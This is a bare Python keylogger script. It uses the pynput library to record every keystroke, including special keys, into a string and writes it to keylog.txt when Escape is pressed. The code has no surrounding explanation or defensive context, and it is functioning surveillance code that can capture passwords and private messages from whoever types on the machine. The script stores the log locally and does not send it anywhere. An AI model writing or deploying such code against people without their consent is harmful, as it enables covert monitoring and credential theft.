import pynput.keyboard

log = ""

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            log += " "
        else:
            log += f" {str(key)} "

    if key == pynput.keyboard.Key.esc:
        write_log(log)
        return False

def write_log(log):
    with open("keylog.txt", "w") as f:
        f.write(log)

with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
